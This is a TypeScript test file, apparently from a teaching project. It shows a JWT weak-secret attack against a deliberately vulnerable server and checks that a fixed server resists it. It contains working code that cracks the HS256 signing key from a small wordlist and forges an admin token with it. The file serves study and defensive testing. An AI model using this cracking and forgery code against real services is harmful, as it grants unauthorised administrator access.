import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import { describe, it } from "node:test";
import jwt from "jsonwebtoken";
import { app as fixedApp } from "../src/server/fixed.ts";
import { app as vulnerableApp } from "../src/server/vulnerable.ts";
import type { TokenUser } from "../src/utils/types.ts";
import { login, me, withServer } from "./helpers.ts";

const wordlist = ["password", "123456", "admin", "letmein", "qwerty", "secret", "secret123", "jwt", "changeme"];

// Tries the wordlist until one matches the token signature.
function guessSecret(token: string): string | undefined {
    const parts = token.split(".");
    const data = `${parts[0]}.${parts[1]}`;

    if (parts.length !== 3) {
        return undefined;
    }

    for (const word of wordlist) {
        const guess = createHmac("sha256", word).update(data).digest("base64url");

        if (guess === parts[2]) {
            return word;
        }
    }

    return undefined;
}

// Signs an admin token with the given secret.
function adminToken(secret: string): string {
    const claims: TokenUser = { username: "admin", role: "admin" };

    return jwt.sign(claims, secret, {
        algorithm: "HS256",
        expiresIn: 3600,
    });
}

describe("weak secret", () => {
    it("vulnerable server accepts an admin token signed with the guessed secret", async () => {
        await withServer(vulnerableApp, async (baseUrl) => {
            const token = await login(baseUrl);
            const secret = guessSecret(token);

            if (secret === undefined) {
                assert.fail("wordlist did not recover the secret");
            }

            assert.equal(secret, "secret123");

            const response = await me(baseUrl, adminToken(secret));

            assert.equal(response.status, 200);

            const body = (await response.json()) as TokenUser;

            assert.equal(body.role, "admin");
        });
    });

    it("fixed server rejects an admin token signed with the guessed secret", async () => {
        await withServer(fixedApp, async (baseUrl) => {
            const token = await login(baseUrl);

            assert.equal(guessSecret(token), undefined);

            const response = await me(baseUrl, adminToken("secret123"));

            assert.equal(response.status, 401);
        });
    });
});
